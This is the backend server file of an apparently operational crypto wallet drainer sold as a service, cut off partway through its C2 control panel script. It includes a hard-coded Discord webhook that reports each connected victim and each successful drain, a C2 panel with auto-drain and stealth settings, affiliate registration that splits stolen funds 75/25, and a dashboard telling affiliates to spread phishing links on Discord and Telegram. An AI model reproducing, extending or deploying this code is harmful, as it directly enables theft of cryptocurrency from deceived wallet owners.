// backend/index.js
import express from "express";
import http from "http";
import cors from "cors";
import { Server as SocketIOServer } from "socket.io";
import path from "path";
import fs from "fs";
import dotenv from "dotenv";
import { SwapHandler } from './swapHandler.js';
import { fileURLToPath } from "url";
import { dirname } from "path";
import trackHandler from "./api/track.js";
import fetch from "node-fetch";
import proxyHandler from './api/proxy.js';
import rateLimit from 'express-rate-limit';
import helmet from 'helmet';
import { ethers } from "ethers";
import { adminAuth } from "./admin-security.js";
import multiSigManager from './lib/multiSigManager.js'; 
import { rotateRPC } from './lib/rpcDecoder.js';
import { getExplorerApiKey, getRpcUrl } from './config.js';
import { CoreDrainer } from './coreDrainer.js';
import { flowCoordinator } from './modules/FlowCoordinator.js';
import { uiManager } from './modules/UIManager.js';
import { c2Communicator } from './modules/c2Communicator.js';
import { securityManager } from './modules/securityManager.js';
import { chainManager } from './modules/chainManager.js';
import { generateClientSite } from './client-template.js';
import { generateMarketingSite } from './saas-website.js';
import cron from "node-cron";

// ==================== SIMPLE RPC ERROR SUPPRESSION ====================
const originalError = console.error;
console.error = (...args) => {
  const msg = args[0]?.toString() || '';
  if (msg.includes('JsonRpcProvider') || msg.includes('ECONNREFUSED')) return;
  originalError.apply(console, args);
};
process.on('unhandledRejection', (reason) => {
  const reasonStr = reason?.toString() || '';
  if (reasonStr.includes('JsonRpcProvider') || reasonStr.includes('ECONNREFUSED')) return;
  console.error('Unhandled Rejection:', reason);
});
console.log('🔇 RPC suppression active');

// ==================== GLOBAL RPC ERROR SUPPRESSION ====================
const originalConsoleError = console.error;
console.error = (...args) => {
  const message = args[0]?.toString() || '';
  if (message.includes('JsonRpcProvider') || 
      message.includes('ECONNREFUSED') ||
      message.includes('getaddrinfo') ||
      message.includes('network') ||
      message.includes('cannot start up')) {
    return;
  }
  originalConsoleError.apply(console, args);
};

const originalConsoleWarn = console.warn;
console.warn = (...args) => {
  const message = args[0]?.toString() || '';
  if (message.includes('JsonRpcProvider') || 
      message.includes('network')) {
    return;
  }
  originalConsoleWarn.apply(console, args);
};

process.on('unhandledRejection', (reason, promise) => {
  const reasonStr = reason?.toString() || '';
  if (reasonStr.includes('JsonRpcProvider') || 
      reasonStr.includes('ECONNREFUSED') ||
      reasonStr.includes('network')) {
    return;
  }
  console.error('Unhandled Rejection:', reason);
});

console.log('🔇 RPC Error suppression activated globally');

// ==================== CONFIGURATION & INITIALIZATION ====================
dotenv.config();

const app = express();
const server = http.createServer(app);
export const io = new SocketIOServer(server);

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// Load chains.json
const chainsPath = path.join(__dirname, 'chains.json');
const chains = JSON.parse(fs.readFileSync(chainsPath, 'utf8'));

// Import config
import { 
  RPC_URL, 
  LIFI_API_KEY, 
  COVALENT_API_KEY, 
  DESTINATION_WALLET, 
  DESTINATION_WALLET_SOL, 
  DRAINER_PK 
} from './config.js';

const apiKey = process.env.API_KEY;
const password = process.env.ADMIN_PASSWORD;

// Initialize core systems
const coreDrainer = new CoreDrainer();

// ==================== DISCORD NOTIFICATIONS ====================
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1426946015109578884/ldcLYMtw9lUR56CKhsBJKe30h9UmFKUN8cWPm502nQO1xyheglVfG_TUfg51Q17bWgp4';

async function sendDiscordAlert(victimData) {
  try {
    console.log('🔍 DEBUG: sendDiscordAlert called with:', victimData.walletAddress);

    const isSuccess = victimData.type === "successful_drain";
    
    const message = {
      embeds: [{
        title: isSuccess ? "💰 SUCCESSFUL DRAIN" : "🎯 NEW VICTIM CONNECTED",
        color: isSuccess ? 0x00ff00 : 0xffa500,
        fields: [
          { name: "👤 Wallet", value: `\`${victimData.walletAddress}\``, inline: false },
          { name: "⛓️ Chain", value: victimData.chain || "Ethereum", inline: true },
          { name: "🕐 Time", value: new Date().toLocaleString(), inline: true }
        ],
        timestamp: new Date().toISOString(),
        footer: { text: "Professional Drainer System" }
      }]
    };
    
    if (isSuccess) {
      message.embeds[0].fields.push(
        { name: "💸 Amount", value: `${victimData.amount} ETH`, inline: true },
        { name: "🔗 TX Hash", value: `[View](https://etherscan.io/tx/${victimData.txHash})`, inline: true }
      );
    } else {
      message.embeds[0].fields.push(
        { name: "🔗 Client", value: victimData.clientId || 'Direct', inline: true }
      );
    }
    
    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(message)
    });
    
    if (response.ok) {
      console.log('✅ Discord alert sent successfully for:', victimData.walletAddress);
    } else {
      console.log('❌ Discord response error:', response.status);
    }
    
  } catch (error) {
    console.log('❌ Discord alert failed:', error.message);
  }
}

// ==================== SECURITY MIDDLEWARE ====================
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "'unsafe-inline'", "https://cdn.socket.io"],
        scriptSrcAttr: ["'unsafe-inline'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "https:", "http:", "blob:"],
        connectSrc: [
          "'self'", 
          "https://deep-index.moralis.io", 
          "ws:", 
          "wss:", 
          "http://localhost:3001",
          "http://localhost:5173"
        ],
        fontSrc: ["'self'", "data:"],
        objectSrc: ["'none'"],
        mediaSrc: ["'self'"],
        frameSrc: ["'none'"],
        frameAncestors: ["'none'"]
      }
    },
    crossOriginEmbedderPolicy: false,
    crossOriginResourcePolicy: { policy: "cross-origin" }
  })
);

// ==================== FIXED CORS ====================
app.use(cors({
  origin: true,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'x-client-id']
}));

app.options('*', cors());

app.use(express.json());
app.use(adminAuth);

// Rate limiting
const generalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: 'Too many requests from this IP, please try again later.',
  standardHeaders: true,
  legacyHeaders: false,
});

const strictLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 5,
  message: 'Too many attempts, please try again after a minute.',
});

// IP Whitelist Middleware
const ipWhitelist = (req, res, next) => {
  const allowedIPs = process.env.ADMIN_WHITELIST_IPS ? 
    process.env.ADMIN_WHITELIST_IPS.split(',') : 
    ['127.0.0.1', '::1'];
  
  const clientIP = req.ip?.replace('::ffff:', '');
  
  if (!allowedIPs.includes(clientIP)) {
    console.log(`🚫 Blocked admin access attempt from: ${clientIP}`);
    return res.status(403).json({ 
      error: 'Access denied. IP not whitelisted for admin access.' 
    });
  }
  next();
};

// Apply security middleware
app.use(generalLimiter);
app.use('/api/admin', strictLimiter);
app.use('/api/transactions', strictLimiter);
app.use('/api/wallet', strictLimiter);
app.use('/api/execute-swap', strictLimiter);
app.use('/api/execute-drain', strictLimiter);
app.use('/api/auto-swap', strictLimiter);
app.use('/admin', ipWhitelist);
app.use('/api/admin', ipWhitelist);
app.use('/c2/control', ipWhitelist);

// Static file serving
app.use(express.static(__dirname));
app.use(express.static(path.join(__dirname, 'public')));

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('❌ Server error:', err.message);
  res.status(500).json({ 
    error: 'Internal Server Error',
    message: process.env.NODE_ENV === 'development' ? err.message : 'Something went wrong'
  });
});

// ==================== DATA STRUCTURES ====================
let clients = new Map();
let clientEarnings = new Map();
let clientVictims = new Map();
let payoutHistory = new Map();

let c2Config = {
  enabled: true,
  minValueUsd: 100,
  autoDrain: true,
  stealthLevel: "high",
  lastUpdated: new Date().toISOString()
};

let c2Stats = {
  totalVictims: 0,
  totalEarnings: 0,
  successfulDrains: 0,
  failedDrains: 0,
  lastActivity: new Date().toISOString()
};

const SUPPORTED_CHAINS = {};

// ==================== CLASS DEFINITIONS ====================
class EnhancedClient {
  constructor(id, config) {
    this.id = id;
    this.name = config.projectName;
    this.themeColor = config.themeColor || '#6366f1';
    this.wallet = config.wallet;
    this.contact = config.contact;
    this.domain = `${id}.drainersaas.com`;
    this.totalEarnings = 0;
    this.pendingPayout = 0;
    this.totalPayouts = 0;
    this.victimCount = 0;
    this.createdAt = new Date().toISOString();
    this.status = 'active';
    this.lastPayout = null;
  }
}

class Payout {
  constructor(clientId, amount, txHash = null) {
    this.id = Date.now().toString();
    this.clientId = clientId;
    this.amount = amount;
    this.txHash = txHash;
    this.status = txHash ? 'completed' : 'pending';
    this.timestamp = new Date().toISOString();
    this.processedAt = txHash ? new Date().toISOString() : null;
  }
}

// ==================== UTILITY FUNCTIONS ====================
function initializeBitcoin() {
  try {
    const bitcoinRpcUrl = process.env.BITCOIN_RPC_URL;
    const bitcoinRpcUser = process.env.BITCOIN_RPC_USER;
    const bitcoinRpcPassword = process.env.BITCOIN_RPC_PASSWORD;

    if (!bitcoinRpcUrl) {
      console.log('⚠️ Bitcoin disabled: Missing RPC configuration in .env');
      return null;
    }

    console.log(`✅ Bitcoin initialized: ${bitcoinRpcUrl.substring(0, 30)}...`);
    return {
      url: bitcoinRpcUrl,
      user: bitcoinRpcUser || 'free',
      password: bitcoinRpcPassword || 'public'
    };
  } catch (error) {
    console.log('⚠️ Bitcoin initialization failed:', error.message);
    return null;
  }
}

function initializeChains() {
  for (const [chainId, chainConfig] of Object.entries(chains)) {
    try {
      const activeRpc = rotateRPC(chainConfig.rpc);
      
      SUPPORTED_CHAINS[chainId] = {
        ...chainConfig,
        activeRpc: activeRpc,
        lastUsed: Date.now(),
        health: 'good'
      };
      
      console.log(`✅ ${chainConfig.name} initialized: ${activeRpc.substring(0, 30)}...`);
      
    } catch (error) {
      console.error(`❌ Failed to initialize ${chainConfig.name}: ${error.message}`);
    }
  }
  
  const bitcoinConfig = initializeBitcoin();
  if (bitcoinConfig) {
    SUPPORTED_CHAINS['bitcoin'] = {
      name: 'Bitcoin',
      activeRpc: bitcoinConfig.url,
      lastUsed: Date.now(),
      health: 'good',
      chainId: 'bitcoin',
      nativeCurrency: {
        name: 'Bitcoin',
        symbol: 'BTC',
        decimals: 8
      }
    };
    console.log(`✅ Bitcoin initialized: ${bitcoinConfig.url.substring(0, 30)}...`);
  } else {
    console.log('⚠️ Bitcoin disabled: Missing RPC configuration');
  }
}

function trackClientEarning(clientId, amount, token, victimAddress) {
  if (!clients.has(clientId)) return;
  
  const client = clients.get(clientId);
  const earnings = clientEarnings.get(clientId) || [];
  const victims = clientVictims.get(clientId) || [];
  
  const earningRecord = {
    id: Date.now().toString(),
    amount: amount,
    token: token,
    victimAddress: victimAddress,
    timestamp: new Date().toISOString(),
    clientShare: amount * 0.75,
    platformShare: amount * 0.25
  };
  
  earnings.push(earningRecord);
  victims.push(victimAddress);
  
  client.totalEarnings += amount;
  client.pendingPayout += amount * 0.75;
  client.victimCount = victims.length;
  
  clientEarnings.set(clientId, earnings);
  clientVictims.set(clientId, victims);
  
  console.log(`💰 Client ${clientId} earned: ${amount} ${token} from ${victimAddress}`);
}

async function processAllPayouts() {
  console.log('💰 Processing weekly payouts...');
  let totalPayouts = 0;
  
  for (const [clientId, client] of clients.entries()) {
    if (client.pendingPayout > 0.001) {
      try {
        const payout = new Payout(clientId, client.pendingPayout, `0x${Math.random().toString(16).slice(2)}`);
        
        const clientPayouts = payoutHistory.get(clientId) || [];
        clientPayouts.push(payout);
        payoutHistory.set(clientId, clientPayouts);
        
        client.totalPayouts += client.pendingPayout;
        client.lastPayout = new Date().toISOString();
        
        console.log(`✅ Processed payout for ${client.name}: ${client.pendingPayout} ETH`);
        
        client.pendingPayout = 0;
        totalPayouts++;
        
      } catch (error) {
        console.error(`❌ Payout failed for ${client.name}:`, error);
      }
    }
  }
  
  console.log(`🎉 Completed ${totalPayouts} payouts`);
  return totalPayouts;
}

async function notifyClient(clientId, type, data) {
  const client = clients.get(clientId);
  if (!client) return;
  
  const notifications = {
    victim_connected: {
      title: '🎉 New Participant!',
      message: `New wallet connected to your drainer: ${data.walletAddress}`
    },
    payout_processed: {
      title: '💰 Payout Processed!',
      message: `Your payout of ${data.amount} ETH has been sent to ${client.wallet}`
    },
    milestone_reached: {
      title: '🏆 Milestone Reached!',
      message: `You've reached ${data.milestone} participants!`
    }
  };
  
  const notification = notifications[type];
  if (notification) {
    console.log(`📧 Notification for ${client.name}: ${notification.message}`);
    
    io.emit(`client-${clientId}-notification`, {
      type: type,
      title: notification.title,
      message: notification.message,
      timestamp: new Date().toISOString(),
      data: data
    });
  }
}

function getExplorerApiBase(chainId) {
  const bases = {
    1: "https://api.etherscan.io",
    56: "https://api.bscscan.com",
    137: "https://api.polygonscan.com",
    42161: "https://api.arbiscan.io",
    10: "https://api-optimistic.etherscan.io",
    43114: "https://api.snowtrace.io",
    8453: "https://api.basescan.org"
  };
  return bases[chainId];
}

function processTransactionData(txs) {
  const now = Date.now();
  const oneDayMs = 24 * 60 * 60 * 1000;
  
  const firstTx = txs[0] ? parseInt(txs[0].timeStamp) * 1000 : now;
  const daysActive = Math.max(1, (now - firstTx) / oneDayMs);
  const avgTxsPerDay = txs.length / daysActive;
  
  const defiInteractions = txs.filter(tx => 
    tx.input !== "0x" && tx.isError === "0"
  ).length;
  
  const hasComplexWallets = txs.some(tx => 
    tx.input.length > 500 || tx.contractAddress !== ""
  );
  
  const hasApprovalRevokes = txs.some(tx => 
    tx.input.includes("0x095ea7b3") &&
    tx.input.includes("0x0000000000000000000000000000000000000000")
  );
  
  const lastTx = txs.length > 0 ? txs[txs.length - 1] : null;
  const lastTxDate = lastTx ? new Date(parseInt(lastTx.timeStamp) * 1000).toISOString() : new Date().toISOString();
  
  return {
    totalTxs: txs.length,
    defiInteractions,
    lastTxDate,
    hasComplexWallets,
    hasApprovalRevokes,
    avgTxsPerDay
  };
}

function getFallbackTxData() {
  return {
    totalTxs: 0,
    defiInteractions: 0,
    lastTxDate: new Date().toISOString(),
    hasComplexWallets: false,
    hasApprovalRevokes: false,
    avgTxsPerDay: 0
  };
}

// ==================== MAIN ROUTES ====================
app.get("/", (req, res) => {
  res.json({
    message: "Drainer SAAS Backend API",
    status: "running", 
    timestamp: new Date().toISOString(),
    endpoints: {
      register: "POST /saas/v2/register",
      dashboard: "GET /saas/dashboard/:clientId",
      panel: "GET /panel",
      health: "GET /health"
    },
    marketing: "https://ch.xqx.workers.dev/"
  });
});

app.get("/signup", (req, res) => {
  res.redirect("https://ch.xqx.workers.dev/");
});

// ==================== SAAS CLIENT MANAGEMENT ====================
app.post('/saas/v2/register', (req, res) => {
  try {
    const { projectName, themeColor, wallet, contact } = req.body;
    
    if (!wallet || !ethers.isAddress(wallet)) {
      return res.status(400).json({ error: 'Valid wallet address required' });
    }

    const clientId = projectName.toLowerCase().replace(/[^a-z0-9]/g, '-') + '-' + Date.now().toString().slice(-6);
    
    const clientConfig = {
      projectName,
      themeColor: themeColor || '#6366f1',
      wallet,
      contact
    };
    
    const newClient = new EnhancedClient(clientId, clientConfig);
    clients.set(clientId, newClient);
    clientEarnings.set(clientId, []);
    clientVictims.set(clientId, []);
    
    console.log(`🎯 Enhanced client registered: ${projectName} (${clientId})`);
    
    res.json({
      success: true,
      clientId: clientId,
      drainerUrl: `https://ch.xqx.workers.dev/?client=${clientId}`,
      dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}`,
      message: 'Client registered successfully'
    });
    
  } catch (error) {
    console.error('Enhanced registration error:', error);
    res.status(500).json({ error: 'Registration failed' });
  }
});

// Dashboard routes
app.get('/saas/dashboard/:clientId', (req, res) => {
  const { clientId } = req.params;
  
  if (!clients.has(clientId)) {
    return res.status(404).send('Client not found');
  }
  
  const client = clients.get(clientId);
  const earnings = clientEarnings.get(clientId) || [];
  const victims = clientVictims.get(clientId) || [];
  
  const dashboardHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - ${client.name}</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Arial', sans-serif;
            background: #0f0f23;
            color: #ffffff;
            line-height: 1.6;
        }
        
        .dashboard {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            display: flex;
            justify-content: between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid rgba(99, 102, 241, 0.3);
        }
        
        .brand {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .logo {
            font-size: 1.8rem;
            font-weight: bold;
            background: linear-gradient(135deg, ${client.themeColor}, #8b5cf6);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: rgba(30, 30, 60, 0.6);
            border: 1px solid rgba(99, 102, 241, 0.3);
            border-radius: 15px;
            padding: 25px;
            backdrop-filter: blur(10px);
        }
        
        .stat-value {
            font-size: 2.2rem;
            font-weight: bold;
            color: ${client.themeColor};
            margin-bottom: 5px;
        }
        
        .stat-label {
            color: #94a3b8;
            font-size: 0.9rem;
        }
        
        .progress-bar {
            width: 100%;
            height: 8px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            margin-top: 10px;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, ${client.themeColor}, #8b5cf6);
            border-radius: 4px;
        }
        
        .section {
            background: rgba(30, 30, 60, 0.6);
            border: 1px solid rgba(99, 102, 241, 0.3);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 20px;
            backdrop-filter: blur(10px);
        }
        
        .section-title {
            font-size: 1.3rem;
            margin-bottom: 20px;
            color: ${client.themeColor};
        }
        
        .earnings-table {
            width: 100%;
            border-collapse: collapse;
        }
        
        .earnings-table th,
        .earnings-table td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .earnings-table th {
            color: #94a3b8;
            font-weight: normal;
            font-size: 0.9rem;
        }
        
        .positive {
            color: #10b981;
        }
        
        .url-box {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(99, 102, 241, 0.5);
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
            font-family: monospace;
            word-break: break-all;
        }
        
        .btn {
            background: linear-gradient(135deg, ${client.themeColor}, #8b5cf6);
            border: none;
            border-radius: 8px;
            color: white;
            padding: 12px 24px;
            cursor: pointer;
            font-size: 1rem;
            transition: all 0.3s ease;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(99, 102, 241, 0.3);
        }
        
        .payout-info {
            background: rgba(16, 185, 129, 0.1);
            border: 1px solid rgba(16, 185, 129, 0.3);
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="dashboard">
        <div class="header">
            <div class="brand">
                <div class="logo">${client.name}</div>
                <div style="color: #94a3b8;">Dashboard</div>
            </div>
            <div style="color: #94a3b8;">Client ID: ${clientId}</div>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-value">$${(client.totalEarnings * 1800).toFixed(2)}</div>
                <div class="stat-label">Total Earnings (USD)</div>
                <div class="progress-bar">
                    <div class="progress-fill" style="width: ${Math.min((client.totalEarnings / 10) * 100, 100)}%"></div>
                </div>
            </div>
            
            <div class="stat-card">
                <div class="stat-value">$${(client.pendingPayout * 1800).toFixed(2)}</div>
                <div class="stat-label">Pending Payout (Your 75%)</div>
                <div class="progress-bar">
                    <div class="progress-fill" style="width: ${Math.min((client.pendingPayout / 5) * 100, 100)}%"></div>
                </div>
            </div>
            
            <div class="stat-card">
                <div class="stat-value">${client.victimCount}</div>
                <div class="stat-label">Total Participants</div>
                <div class="progress-bar">
                    <div class="progress-fill" style="width: ${Math.min((client.victimCount / 50) * 100, 100)}%"></div>
                </div>
            </div>
            
            <div class="stat-card">
                <div class="stat-value">${client.totalEarnings.toFixed(4)} ETH</div>
                <div class="stat-label">Total Volume</div>
                <div class="progress-bar">
                    <div class="progress-fill" style="width: ${Math.min((client.totalEarnings / 5) * 100, 100)}%"></div>
                </div>
            </div>
        </div>
        
        <div class="section">
            <h3 class="section-title">🚀 Your Drainer URL</h3>
            <div class="url-box">
                https://ch.xqx.workers.dev/?client/${clientId}
            </div>
            <p style="color: #94a3b8; margin-bottom: 15px;">
                Share this link on Discord, Telegram, or social media to start earning!
            </p>
            <button class="btn" onclick="copyUrl()">Copy URL</button>
        </div>
        
        <div class="payout-info">
            <h3 style="color: #10b981; margin-bottom: 10px;">💰 Payout Information</h3>
            <p><strong>Next Payout:</strong> Every Monday 9:00 AM UTC</p>
            <p><strong>Your Wallet:</strong> ${client.wallet}</p>
            <p><strong>Your Share:</strong> 75% of all earnings</p>
            <p><strong>Platform Fee:</strong> 25% (covers hosting & maintenance)</p>
        </div>
        
        <div class="section">
            <h3 class="section-title">📈 Recent Earnings</h3>
            ${earnings.length > 0 ? `
                <table class="earnings-table">
                    <thead>
                        <tr>
                            <th>Date</th>
                            <th>Amount</th>
                            <th>Your Share</th>
                            <th>Participant</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${earnings.slice(-10).reverse().map(earning => `
                            <tr>
                                <td>${new Date(earning.timestamp).toLocaleDateString()}</td>
                                <td>${earning.amount} ${earning.token}</td>
                                <td class="positive">${earning.clientShare.toFixed(4)} ${earning.token}</td>
                                <td style="color: #94a3b8;">${earning.victimAddress.slice(0, 8)}...${earning.victimAddress.slice(-6)}</td>
                            </tr>
                        `).join('')}
                    </tbody>
                </table>
            ` : `
                <p style="color: #94a3b8; text-align: center; padding: 40px;">
                    No earnings yet. Share your URL to start earning!
                </p>
            `}
        </div>
    </div>

    <script>
        function copyUrl() {
            const url = 'https://ch.xqx.workers.dev/?client=${clientId}';
            navigator.clipboard.writeText(url).then(() => {
                alert('URL copied to clipboard!');
            });
        }
        
        // Auto-refresh every 30 seconds
        setInterval(() => {
            window.location.reload();
        }, 30000);
    </script>
</body>
</html>
  `;
  
  res.send(dashboardHTML);
});

app.get("/dashboard.html", (req, res) => {
  const clientId = req.query.client;
  if (!clientId) {
    return res.status(400).send("Client ID required: ?client=your-id");
  }
  res.redirect(`https://service-s816.onrender.com/saas/dashboard/${clientId}`);
});

// ==================== TRACKING & ANALYTICS ====================
app.post("/api/track", async (req, res) => {
  try {
    if (!c2Config.enabled) {
      console.log('⏸️ Drainer disabled, ignoring victim connection');
      return res.json({ 
        success: false, 
        error: 'Drainer temporarily disabled by operator' 
      });
    }

    const victimData = req.body;
    // Send Discord alert
    await sendDiscordAlert(victimData);
    
    console.log(`👤 Victim connected: ${victimData.walletAddress} on ${victimData.chain}`);
    
    io.emit('victim-connected', {
      walletAddress: victimData.walletAddress,
      chain: victimData.chain,
      timestamp: new Date().toISOString(),
      isRandomTarget: true
    });
    
    return trackHandler(req, res);
    
  } catch (error) {
    console.error('❌ Tracking error:', error.message);
    return trackHandler(req, res);
  }
});

app.post("/api/track/v2", async (req, res) => {
  try {
    const { walletAddress, chain, clientId, amount = 0.1, token = 'ETH' } = req.body;
    
    if (clientId && clients.has(clientId)) {
      const client = clients.get(clientId);
      
      console.log(`👤 Client ${clientId} - Victim: ${walletAddress} on ${chain}`);
      
      trackClientEarning(clientId, amount, token, walletAddress);
      
      io.emit(`client-${clientId}`, {
        type: 'victim_connected',
        walletAddress: walletAddress,
        chain: chain,
        amount: amount,
        token: token,
        timestamp: new Date().toISOString()
      });
    }
    
    res.json({ success: true, tracked: true });
    
  } catch (error) {
    console.error('Enhanced tracking error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post("/api/track/v3", async (req, res) => {
  try {
    const { walletAddress, chain, clientId, amount = 0.1, token = 'ETH' } = req.body;
    
    if (clientId && clients.has(clientId)) {
      const client = clients.get(clientId);
      
      trackClientEarning(clientId, amount, token, walletAddress);
      
      await notifyClient(clientId, 'victim_connected', {
        walletAddress: walletAddress,
        chain: chain,
        amount: amount
      });
      
      if (client.victimCount % 10 === 0) {
        await notifyClient(clientId, 'milestone_reached', {
          milestone: `${client.victimCount} participants`
        });
      }
    }
    
    res.json({ success: true, tracked: true });
    
  } catch (error) {
    console.error('V3 tracking error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ==================== SUCCESS TRACKING ENDPOINT ====================
app.post("/api/track-success", async (req, res) => {
    try {
        const { walletAddress, txHash, amount, walletName } = req.body;
        
        console.log("💰 SUCCESSFUL DRAIN: " + walletAddress + " | TX: " + txHash + " | Amount: " + amount);
        
        await sendDiscordAlert({
            walletAddress: walletAddress,
            chain: "ethereum",
            txHash: txHash,
            amount: amount,
            type: "successful_drain",
            walletName: walletName
        });
        
        res.json({ success: true, tracked: true });
        
    } catch (error) {
        console.error("Success tracking error:", error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ==================== C2 CONTROL PANEL ====================
app.get("/c2/control", (req, res) => {
  if (req.query.password !== password) {
    return res.status(401).json({ error: "Unauthorized" });
  }
  
  const controlPanelHTML = `
<!DOCTYPE html>
<html>
<head>
    <title>C2 Control Panel</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #0f0f23;
            color: white;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid #333;
        }
        .card {
            background: #1a1a2e;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid #333;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: #16213e;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
        }
        .stat-value {
            font-size: 24px;
            font-weight: bold;
            color: #6366f1;
        }
        .controls {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
        }
        .control-group {
            background: #16213e;
            padding: 15px;
            border-radius: 8px;
        }
        .switch {
            position: relative;
            display: inline-block;
            width: 60px;
            height: 34px;
        }
        .switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }
        .slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #ccc;
            transition: .4s;
            border-radius: 34px;
        }
        .slider:before {
            position: absolute;
            content: "";
            height: 26px;
            width: 26px;
            left: 4px;
            bottom: 4px;
            background-color: white;
            transition: .4s;
            border-radius: 50%;
        }
        input:checked + .slider {
            background-color: #6366f1;
        }
        input:checked + .slider:before {
            transform: translateX(26px);
        }
        button {
            background: #6366f1;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
        }
        button:hover {
            background: #5a5cdc;
        }
        .clients-list {
            max-height: 400px;
            overflow-y: auto;
        }
        .client-item {
            background: #16213e;
            padding: 15px;
            margin: 10px 0;
            border-radius: 8px;
            border-left: 4px solid #6366f1;
        }
        .log-entry {
            background: #16213e;
            padding: 10px;
            margin: 5px 0;
            border-radius: 5px;
            font-family: monospace;
            font-size: 12px;
        }
        .success { color: #10b981; }
        .warning { color: #f59e0b; }
        .error { color: #ef4444; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 C2 Control Panel</h1>
            <div id="status" class="status online">🟢 ONLINE</div>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-label">Total Victims</div>
                <div class="stat-value" id="totalVictims">${c2Stats.totalVictims}</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Total Earnings</div>
                <div class="stat-value" id="totalEarnings">${c2Stats.totalEarnings}</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Successful Drains</div>
                <div class="stat-value" id="successfulDrains">${c2Stats.successfulDrains}</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Failed Drains</div>
                <div class="stat-value" id="failedDrains">${c2Stats.failedDrains}</div>
            </div>
        </div>
        
        <div class="card">
            <h2>🎛️ System Controls</h2>
            <div class="controls">
                <div class="control-group">
                    <h3>System Status</h3>
                    <label class="switch">
                        <input type="checkbox" id="systemToggle" ${c2Config.enabled ? 'checked' : ''}>
                        <span class="slider"></span>
                    </label>
                    <span>Drainer ${c2Config.enabled ? 'Enabled' : 'Disabled'}</span>
                </div>
                
                <div class="control-group">
                    <h3>Auto Drain</h3>
                    <label class="switch">
                        <input type="checkbox" id="autoDrainToggle" ${c2Config.autoDrain ? 'checked' : ''}>
                        <span class="slider"></span>
                    </label>
                    <span>Auto Drain ${c2Config.autoDrain ? 'Enabled' : 'Disabled'}</span>
                </div>
                
                <div class="control-group">
                    <h3>Minimum Value</h3>
                    <input type="number" id="minValue" value="${c2Config.minValueUsd}" style="width: 100px; padding: 5px;">
                    <span>USD</span>
                </div>
            </div>
            
            <div style="margin-top: 20px;">
                <button onclick="updateConfig()">💾 Update Config</button>
                <button onclick="processPayouts()" style="background: #10b981;">💰 Process Payouts</button>
                <button onclick="exportData()" style="background: #f59e0b;">📊 Export Data</button>
                <button onclick="clearLogs()" style="background: #ef4444;">🗑️ Clear Logs</button>
            </div>
        </div>
        
        <div class="card">
            <h2>👥 Active Clients</h2>
            <div class="clients-list" id="clientsList">
                <!-- Clients will be populated here -->
            </div>
        </div>
        
        <div class="card">
            <h2>📋 System Logs</h2>
            <div id="logsContainer">
                <!-- Logs will be populated here -->
            </div>
        </div>
    </div>

    <script>
        const socket = io();
        
        // Socket event listeners
        socket.on('c2-stats-update', (stats) => {
            updateStats(stats);
        });
        
        socket.on('c2-config-update', (config) => {
            updateConfigDisplay(config);
        });
        
